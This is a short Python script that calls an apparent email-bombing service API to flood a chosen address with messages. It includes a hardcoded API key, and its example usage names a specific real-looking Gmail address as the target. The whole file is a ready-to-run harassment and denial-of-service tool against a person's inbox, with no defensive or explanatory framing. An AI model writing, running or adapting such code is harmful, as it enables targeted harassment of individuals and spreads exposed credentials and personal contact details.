import requests

def send_email_bomb(target_email: str, amount: int):
    url = "https://api.emailbomb.cc/v1/task"
    headers = {
        "accept": "application/json",
        "X-API-Key": "1cff87f91a3486a17f12d8244aa8393e28726749",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "target": target_email,
        "amount": amount
    }
    
    response = requests.post(url, headers=headers, data=data)
    return response.json()

# Example usage
if __name__ == "__main__":
    target_email = "harsh040302@gmail.com"
    amount = 1
    response = send_email_bomb(target_email, amount)
    print(response)
